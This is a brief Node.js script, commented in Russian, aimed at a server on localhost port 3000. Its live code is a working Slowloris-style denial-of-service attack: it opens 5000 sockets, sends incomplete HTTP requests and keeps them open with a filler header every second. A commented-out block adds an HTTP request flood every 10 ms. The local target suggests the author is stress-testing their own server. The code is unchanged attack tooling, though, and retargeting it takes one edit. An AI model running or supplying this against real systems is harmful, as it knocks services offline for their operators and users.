const net = require('net');
const target = '127.0.0.1';
const port = 3000;

for (let i = 0; i < 5000; i++) {
  const socket = new net.Socket();

  socket.connect(port, target, () => {
    console.log(`Подключение ${i} установлено`);
    // Отправляем частичный HTTP-запрос
    socket.write('GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n');
  });
  // Каждые несколько секунд дописываем часть запроса, чтобы держать соединение открытым
  setInterval(() => {
    socket.write('X-a: b\r\n');
  }, 1000);
}
/*
const http = require('http');

const target = 'localhost';
const port = 3000;

for (let i = 0; i < 1000; i++) {
  setInterval(() => {
    http.get(`http://${target}:${port}/`, (res) => {
      // ничего не делаем, просто нагружаем сервер
    }).on('error', (err) => {
      console.log('Ошибка подключения:', err.message);
    });
  }, 10); // каждые 10 мс
}*/